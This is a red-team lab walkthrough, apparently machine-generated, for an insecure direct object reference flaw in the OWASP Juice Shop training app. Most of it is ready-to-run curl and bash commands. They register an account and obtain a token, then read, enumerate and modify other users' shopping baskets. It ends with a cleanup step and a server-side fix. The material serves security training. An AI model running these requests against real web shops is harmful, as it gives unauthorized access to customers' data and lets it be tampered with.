# Attack Walkthrough — IDOR Basket Access
**Target**: OWASP Juice Shop | **Mission**: 2026-03-12-003
**Vulnerability**: IDOR on /rest/basket/:id and /api/BasketItems
**Difficulty**: Easy
**Required Privileges**: Any registered user account

---

## Overview

This walkthrough demonstrates a complete Insecure Direct Object Reference (IDOR) attack
against OWASP Juice Shop's shopping basket API. You will read and modify baskets belonging
to other users using only a basic customer account.

---

## Step 1 — Setup: Register an Attacker Account

No existing account is needed. Juice Shop allows open registration.

```bash
TARGET="10.10.30.130:3000"

curl -s -X POST "http://$TARGET/api/Users" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.lab","password":"Pass1234","passwordRepeat":"Pass1234","securityQuestion":{"id":1,"question":"test"},"securityAnswer":"test"}'
```

**Expected Response**: HTTP 200 with new user's ID (note your assigned User ID).

---

## Step 2 — Authenticate and Obtain JWT

```bash
AUTH_RESPONSE=$(curl -s -X POST "http://$TARGET/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.lab","password":"Pass1234"}')

echo "$AUTH_RESPONSE"

# Extract the JWT token
JWT=$(echo "$AUTH_RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")
echo "JWT: $JWT"
echo "Your basket ID: $(echo "$AUTH_RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['bid'])")"
```

**Expected**: You receive a JWT and a basket ID (e.g., bid=7 for User ID 24).

---

## Step 3 — Exploit 1: Read Another User's Basket (IDOR Read)

Use your JWT to request basket ID 1 (belongs to admin, User ID 1):

```bash
curl -s "http://$TARGET/rest/basket/1" \
  -H "Authorization: Bearer $JWT" | python3 -m json.tool
```

**Expected Response**: HTTP 200 with the admin's full basket contents including all products,
quantities, and prices.

**Why this works**: The server checks that a JWT exists and is valid, but never compares
the JWT's user ID (`1` for admin, `24` for attacker) to the basket's `UserId` field.

---

## Step 4 — Enumerate All Baskets

Basket IDs are sequential integers. Iterate to map all active baskets:

```bash
for bid in 1 2 3 4 5 6 7 8 9 10; do
  result=$(curl -s "http://$TARGET/rest/basket/$bid" -H "Authorization: Bearer $JWT")
  uid=$(echo "$result" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('UserId','N/A'))" 2>/dev/null)
  items=$(echo "$result" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get('data',{}).get('Products',[])))" 2>/dev/null)
  echo "Basket $bid => UserId=$uid  items=$items"
done
```

**Expected**: All populated baskets return HTTP 200 with UserId and item count.

---

## Step 5 — List All Basket Items Across All Users

A separate API endpoint leaks all basket items from all users simultaneously:

```bash
curl -s "http://$TARGET/api/BasketItems" \
  -H "Authorization: Bearer $JWT" | python3 -m json.tool | head -50
```

**Expected**: All items from all baskets (not filtered to your basket) — includes BasketId,
ProductId, and quantity for every user's cart.

---

## Step 6 — Exploit 2: Modify Another User's Basket Item (IDOR Write)

From Step 5, identify a basket item belonging to another user. For example, item ID 4
belongs to BasketId 2 (Jim's basket).

```bash
# Modify the quantity of Jim's item (id=4) from its original value to 5
curl -s -X PUT "http://$TARGET/api/BasketItems/4" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"quantity":5}'
```

**Expected Response**: `{"status":"success","data":{"id":4,"quantity":5,...}}`

**Verify the modification was applied**:
```bash
curl -s "http://$TARGET/rest/basket/2" -H "Authorization: Bearer $JWT" | python3 -m json.tool
```

The quantity for Jim's item will now show 5 instead of its original value.

---

## Step 7 — Cleanup Note (Lab Context)

In a real engagement, restore the modified item to its original state. In the lab,
you can restore Jim's item:

```bash
curl -s -X PUT "http://$TARGET/api/BasketItems/4" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"quantity":2}'
```

---

## Key Takeaways

| Concept | Demonstration |
|---------|--------------|
| IDOR (Read) | Basket ID 1 accessed with any valid JWT — no ownership check |
| IDOR (Write) | Any basket item modified using its numeric ID — no ownership check |
| Enumeration | Sequential integer IDs trivially enumerated 1, 2, 3... |
| Data Leak | /api/BasketItems returns ALL users' cart items unfiltered |
| Low Privilege | Only a free customer account required — zero privilege escalation |

---

## Remediation Reference

The fix is a single server-side authorization check added to the basket route handler:
```javascript
// Express route handler pseudocode
router.get('/rest/basket/:id', security.isAuthorized, async (req, res) => {
  const basket = await Basket.findByPk(req.params.id)
  // ADD THIS CHECK:
  if (basket.UserId !== req.user.data.id && req.user.data.role !== 'admin') {
    return res.status(403).json({ error: 'You can only access your own basket' })
  }
  // ... rest of handler
})
```

The same pattern must be applied to `PUT /api/BasketItems/:id` and `DELETE /api/BasketItems/:id`.

---

*Generated by redteam-master | Mission 2026-03-12-003 | OWASP Juice Shop Lab*
